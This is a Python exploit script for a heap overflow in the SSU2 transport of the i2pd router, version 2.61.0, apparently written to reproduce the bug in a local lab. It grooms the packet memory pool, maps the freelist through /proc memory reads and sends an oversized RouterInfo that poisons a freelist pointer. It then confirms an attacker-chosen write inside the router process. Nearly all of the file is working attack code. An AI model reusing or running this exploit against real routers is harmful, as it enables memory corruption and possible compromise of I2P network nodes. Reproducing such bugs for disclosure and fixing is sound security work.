#!/usr/bin/env python3
"""atk_chain_v1.py — VULN-01 terminal chain, mechanism-validation run (glibc build).

FOR MAINTAINER REPRODUCTION ONLY: targets 45.45.45.1 inside an unshare -Urn
network namespace on the maintainer's own machine. No public-target capability.

Validates the full poison->pop->write choreography with Q aimed at a
deterministic heap dead-zone (Q = X+1400, inside X/Y freed pool chunks):
  setup -> groom batches -> freelist topology mapping (probe + chain walk)
  -> pick adjacent (X, X+1536) pair -> deliver POISON_RI (1640B, numResends=3,
  0x605 patch, poison Q at RI[1531]) -> atomic [ack(Y), ack(X), R1(1420)]
  -> R2(100) pops Y -> R3(1420) pops Q -> verify marker at Q+16.

Source-verified branch conditions (i2pd 2.61.0):
  - CreateRouterInfoBlock: `size+5 < len` -> raw memcpy; underflow len (relay
    block > 1408) makes this always true -> full RI memcpy = overflow.
  - HandleAckRange: ascending erase => LIFO release order; two Ack blocks in
    one Data packet give [ack(Y) then ack(X)] -> X.head, X.next = Y.
  - SendQuickAck uses the stack-buffer SendData => never touches the pool.
"""
import sys, os, time, struct, json, signal
sys.path.insert(0, "/home/z/my-project/scripts")
from ssu2lib import *

LAB = "/home/z/my-project/lab"
RI_POISON = 1664          # big RI: pad covers RI[551..], poison slot 1531 inside pad
RELAY_BIG = 1420          # > 1408 -> size_t underflow -> raw memcpy
RELAY_SMALL = 100

def rd_mem(mem, addr, n):
    mem.seek(addr); return mem.read(n)

def scan_pool_chunks(bob_pid, idpref):
    """SIGSTOP + scan rw anon regions for pool chunks containing the RI.
    Pattern = idpref[3:]: bytes 0..2 of idpref overlap the freelist next
    pointer (payload+0..7) once the block is FREED, so a full-idpref match
    only sees LIVE blocks. Matching from payload+8 sees both states.
    Returns {chunk_addr: hdr8hex}; LIVE = hdr starts with '02' (RI block)."""
    pat = idpref[3:]
    os.kill(bob_pid, signal.SIGSTOP); time.sleep(0.12)
    out = {}
    try:
        maps = open("/proc/%d/maps" % bob_pid).read()
        with open("/proc/%d/mem" % bob_pid, "rb", 0) as mem:
            for line in maps.splitlines():
                parts = line.split(None, 5)
                a, b = parts[0].split("-")
                a, b = int(a, 16), int(b, 16)
                name = parts[5].strip() if len(parts) > 5 else ""
                if "rw" not in parts[1] or "i2pd" in name or "[stack" in name: continue
                if b - a > 0x4000000: continue
                try:
                    mem.seek(a); data = mem.read(b - a)
                except Exception: continue
                st = 0
                while True:
                    i = data.find(pat, st)
                    if i < 0: break
                    chunk = a + i - 8
                    if chunk % 16 == 0:
                        out[chunk] = data[chunk - a:chunk - a + 8].hex()
                    st = i + 1
    finally:
        os.kill(bob_pid, signal.SIGCONT); time.sleep(0.05)
    return out

def read_qwords(bob_pid, addrs):
    os.kill(bob_pid, signal.SIGSTOP); time.sleep(0.12)
    out = {}
    try:
        with open("/proc/%d/mem" % bob_pid, "rb", 0) as mem:
            for a in addrs:
                try: out[a] = struct.unpack("<Q", rd_mem(mem, a, 8))[0]
                except Exception: out[a] = None
    finally:
        os.kill(bob_pid, signal.SIGCONT); time.sleep(0.05)
    return out

class Chain:
    def __init__(self):
        self.bob = bob_keys(LAB + "/bob-data/router.info")
        self.bob_pid = int(open(LAB + "/bob-data/i2pd.pid").read().strip())
        self.alice, self.charlie = NodeIdentity(), NodeIdentity()
        self.ri_ts = int(time.time() * 1000)
        self.sa = self.sc = None
        self.charlie_log = []      # (pkt_num, nonce or None, size)

    def mk_ri(self, ident, addr_pad=b"", bump=1):
        self.ri_ts += bump
        return build_ri(ident, self.ri_ts,
                        [("netId", "2"), ("caps", "R"), ("router.version", "2.61.0")],
                        [("host", EVIL_IP), ("port", str(ALICE_PORT)),
                         ("s", i2p_b64(ident.st_pub)),
                         ("i", i2p_b64(ident.ikey)), ("v", "2")],
                        addr_pad=addr_pad)

    def setup(self):
        ri_c = self.mk_ri(self.charlie, bump=5)
        ri_a = self.mk_ri(self.alice)
        self.sc = Peer("charlie", self.charlie, CHARLIE_PORT, self.bob)
        self.sc.handshake(ri_c, relay_tag_req=True)
        self.sa = Peer("alice", self.alice, ALICE_PORT, self.bob)
        self.sa.handshake(ri_a)
        log("setup", "tag=%08x bob_pid=%d" % (self.sc.relay_tag, self.bob_pid))
        self.idpref = ri_a[:32]

    def drain(self, peer, want_nonces=None, timeout=1.5):
        """Receive Bob's relay packets; record nonce->LATEST pkt_num (retransmits
        re-key m_SentPackets, so the newest number is the one to ack)."""
        seen, t0 = {}, time.time()
        while time.time() - t0 < timeout:
            if want_nonces is not None and set(seen) >= set(want_nonces): break
            r = peer.recv_data(timeout=0.08)
            if r is None: continue
            if r[0] == "LEAK":
                log(peer.name, "*** LEAK %d B ***" % len(r[1])); continue
            if r[0] == "OTHER": continue
            num, blocks = r
            for t, c in blocks:
                if t == B_RELAYINTRO and len(c) >= 37:
                    nonce = struct.unpack(">I", c[33:37])[0]
                    seen[nonce] = num            # latest sighting wins
                    break
        return seen

    def settle(self, peer, nonces, rounds=4):
        """Ack the latest packet number per nonce; keep draining+re-acking
        while retransmits keep arriving (RTO churn re-keys m_SentPackets)."""
        pend = set(nonces)
        for _ in range(rounds):
            if not pend: break
            r = self.drain(peer, want_nonces=None, timeout=0.35)
            fresh = {n: p for n, p in r.items() if n in pend}
            if not fresh: break
            self.ack_exact(peer, fresh.values())
            pend -= set(fresh)
            time.sleep(0.1)
        return pend   # nonces still un-acked (should be empty)

    def ack_exact(self, peer, pkt_nums):
        """Precisely-targeted single-packet Ack blocks (ascending order in one
        Data packet => LIFO release in that order). Only relay packet numbers:
        QuickAck packet numbers own no pool chunk."""
        blocks = [blk_datetime()]
        for p in sorted(pkt_nums):
            blocks.append(blk_ack(p, acnt=0))
        peer.send_data(blocks)

    def fire_batch(self, n, nonce_base, tag, ln=RELAY_SMALL, gap=0.04):
        nums = []
        for i in range(n):
            self.sa.fire_relay_request(tag, nonce_base + i, ln)
            nums.append(nonce_base + i)
            time.sleep(gap)
        return nums

def main():
    ch = Chain()
    ch.setup()
    tag = ch.sc.relay_tag

    # ---- stage 1: batch 1 (10 live chunks), then free them all ----
    want1 = ch.fire_batch(10, 0x1000, tag, gap=0.03)
    nm1 = ch.drain(ch.sc, want_nonces=want1, timeout=2.0)
    log("groom1", "nonce->pkt: %s" % {hex(k): v for k, v in sorted(nm1.items())})
    if len(nm1) < 10: raise SystemExit("groom1: only %d/10 relays seen" % len(nm1))
    ch.ack_exact(ch.sc, nm1.values())
    left = ch.settle(ch.sc, want1)
    log("groom1", "settle leftovers: %s" % [hex(x) for x in left])
    time.sleep(0.2)

    # ---- stage 2: batch 2 pops 8 (recycle), ack all, then probe chain ----
    want2 = ch.fire_batch(8, 0x2000, tag, gap=0.03)
    nm2 = ch.drain(ch.sc, want_nonces=want2, timeout=2.0)
    log("groom2", "nonce->pkt: %s" % {hex(k): v for k, v in sorted(nm2.items())})
    if len(nm2) < 8: raise SystemExit("groom2: only %d/8 relays seen" % len(nm2))
    ch.ack_exact(ch.sc, nm2.values())
    left2 = ch.settle(ch.sc, want2)
    log("groom2", "settle leftovers: %s" % [hex(x) for x in left2])
    time.sleep(0.2)

    # ---- stage 3: chain walk over the freed blocks ----
    freed = scan_pool_chunks(ch.bob_pid, ch.idpref)
    cand = [a for a in freed if freed[a][:2] != "02"]
    log("probeC", "freed-looking chunks: %d: %s" % (len(cand), [hex(a) for a in cand]))
    nxt = read_qwords(ch.bob_pid, cand)
    inset = set(cand)
    edges = {a: v for a, v in nxt.items() if v in inset}
    # topological order: head = not pointed to by anyone in cand
    pointed = set(edges.values())
    heads = [a for a in cand if a not in pointed]
    log("chain", "heads=%s edges=%s" % ([hex(h) for h in heads],
        {hex(k): hex(v) for k, v in edges.items()}))
    if len(heads) != 1:
        raise SystemExit("chain walk ambiguous: %d heads" % len(heads))
    chain = []
    cur = heads[0]
    while cur in edges:
        chain.append(cur); cur = edges[cur]
    chain.append(cur)
    log("chain", "freelist order (head first): %s" % [hex(a) for a in chain])
    chain = chain[:8]      # first 8 = batch-2 blocks (rest = batch-1 leftovers)
    if len(chain) < 6:
        raise SystemExit("chain too short: %d" % len(chain))

    # ---- stage 4: batch 3 pops the chain in order; map chain[j] -> pkt ----
    want3 = ch.fire_batch(len(chain), 0x3000, tag, gap=0.03)
    nm3 = ch.drain(ch.sc, want_nonces=want3, timeout=2.0)
    log("groom3", "nonce->pkt: %s" % {hex(k): v for k, v in sorted(nm3.items())})
    if len(nm3) != len(chain):
        raise SystemExit("batch3 anchoring incomplete: %d/%d" % (len(nm3), len(chain)))
    pkt_of_chain = {k: nm3[0x3000 + k] for k in range(len(chain))}
    log("map", "chain idx -> pkt: %s" % pkt_of_chain)

    # ---- stage 5: pick adjacent pair (X, X+1536) ----
    addr_set = set(chain)
    pairs = [(a, a + 1536) for a in chain if a + 1536 in addr_set]
    log("pairs", "adjacent (X,Y) in chain: %s" % [(hex(x), hex(y)) for x, y in pairs])
    if not pairs:
        raise SystemExit("no adjacent pair — rerun for another layout")
    X, Y = pairs[0]
    xi = chain.index(X); yi = chain.index(Y)
    pktY, pktX = pkt_of_chain[yi], pkt_of_chain[xi]
    Q = (X + 1400) & ~0xf
    log("target", "X=%#x(pkt %d) Y=%#x(pkt %d) Q=%#x" % (X, pktX, Y, pktY, Q))

    # ---- stage 6: build POISON RI ----
    base_small = ch.mk_ri(ch.alice, bump=2)
    probe = ch.mk_ri(ch.alice, addr_pad=b"ZZZZ", bump=2)
    apo = probe.find(b"ZZZZ")
    padlen = RI_POISON - len(base_small)
    pad = bytearray(b"B" * padlen)
    def put(off, data):
        po = off - apo
        assert 0 <= po and po + len(data) <= len(pad), (off, po, len(pad))
        pad[po:po+len(data)] = data
    put(1515, struct.pack("<i", 3))       # numResends = 3
    put(1523, struct.pack("<Q", 0x605))   # Y chunk size field (io arena)
    put(1531, struct.pack("<Q", Q))       # Y pool-freelist next = Q  <-- POISON
    put(600,  b"R3WROTEHERE!")            # lands at Q+605
    ri_poison = ch.mk_ri(ch.alice, addr_pad=bytes(pad), bump=3)
    log("ri", "POISON RI %d B (apo=%d padlen=%d)" % (len(ri_poison), apo, padlen))
    ch.sa.deliver_ri(ri_poison)
    time.sleep(0.25)

    # ---- stage 6.5: resync packet numbers (retransmit churn re-keys them) ----
    rs = ch.drain(ch.sc, want_nonces=None, timeout=0.5)
    for k in pkt_of_chain:
        if 0x3000 + k in rs:
            pkt_of_chain[k] = rs[0x3000 + k]
    pktY, pktX = pkt_of_chain[yi], pkt_of_chain[xi]
    log("resync", "pktX=%d pktY=%d" % (pktX, pktY))

    # ---- stage 7: atomic choreography (back-to-back, NO acks of R1/R2) ----
    # acking R1/R2's packets would Release their blocks back onto the pool
    # head, and R3 would pop Y instead of Q (observed empirically).
    ch.sc.send_data([blk_datetime(), blk_ack(pktY, acnt=0), blk_ack(pktX, acnt=0)])
    ch.sa.fire_relay_request(tag, 0x4100, RELAY_BIG)     # R1: pop X, poison Y.next=Q
    ch.sa.fire_relay_request(tag, 0x4101, RELAY_SMALL)   # R2: pop Y -> head=Q
    ch.sa.fire_relay_request(tag, 0x4102, RELAY_BIG)     # R3: pop Q -> WRITE at Q+5
    # collect the aftermath (evidence; do NOT ack anything)
    r1 = ch.drain(ch.sc, want_nonces=[0x4101], timeout=2.0)
    log("R2", "pop-Y relay seen: %s" % {hex(k): v for k, v in r1.items()})
    leaks = 0
    t0 = time.time()
    while time.time() - t0 < 1.5:
        r = ch.sc.recv_data(timeout=0.1)
        if r is None: continue
        if r[0] == "LEAK": leaks += 1
    log("aftermath", "R1/R3 leak retransmissions observed: %d" % leaks)
    time.sleep(0.2)

    # ---- stage 8: verify (full dump for diagnosis) ----
    alive = os.path.exists("/proc/%d" % ch.bob_pid)
    log("post", "bob alive: %s" % alive)
    ok = False
    if alive:
        os.kill(ch.bob_pid, signal.SIGSTOP); time.sleep(0.12)
        try:
            with open("/proc/%d/mem" % ch.bob_pid, "rb", 0) as mem:
                xnum = struct.unpack("<i", rd_mem(mem, X + 1520, 4))[0]
                zone = rd_mem(mem, Q + 580, 64)
                hit = b"R3WROTEHERE!" in zone
                log("verify", "X.numResends=%d (want 3)" % xnum)
                log("verify", "Q+580..Q+644: %s" % zone.hex())
                # diagnostic dump: X block overview
                xb = rd_mem(mem, X, 256)
                log("dump", "X+0..256: %s" % xb[:96].hex())
                log("dump", "X+1500..1600: %s" % rd_mem(mem, X + 1500, 100).hex())
                log("dump", "Y+0..96: %s" % rd_mem(mem, Y, 96).hex())
                log("dump", "Y+1500..1600: %s" % rd_mem(mem, Y + 1500, 100).hex())
                # where did POISON (B-run) land? scan for 'R3WROTEHERE!' and
                # long B runs around X..X+3200
                big = rd_mem(mem, X - 64, 3400)
                mpos, moffs = 0, []
                while mpos >= 0:
                    mpos = big.find(b"R3WROTEHERE!", mpos if mpos == 0 else mpos + 1)
                    if mpos >= 0: moffs.append(mpos - 64)
                log("dump", "markers in X-64..X+3336: %s" %
                    (["X%+d" % o for o in moffs] or "NOT FOUND"))
                br = big.find(b"BBBBBBBBBBBBBBBB")
                log("dump", "B-run in X-64..: %s" %
                    ("X%+d" % (br - 64) if br >= 0 else "NOT FOUND"))
                # Q region wide
                log("dump", "Q-64..Q+64: %s" % rd_mem(mem, Q - 64, 128).hex())
                log("RESULT", "*** %s ***" %
                    ("WRITE VERIFIED AT Q+605" if hit else "WRITE NOT FOUND"))
                ok = hit and xnum == 3
        finally:
            os.kill(ch.bob_pid, signal.SIGCONT)
    with open(LAB + "/ev/chain_v1_result.txt", "w") as f:
        f.write("X=%#x Y=%#x Q=%#x alive=%s verified=%s\n" % (X, Y, Q, alive, ok))
    return 0 if ok else 1

if __name__ == "__main__":
    sys.exit(main())
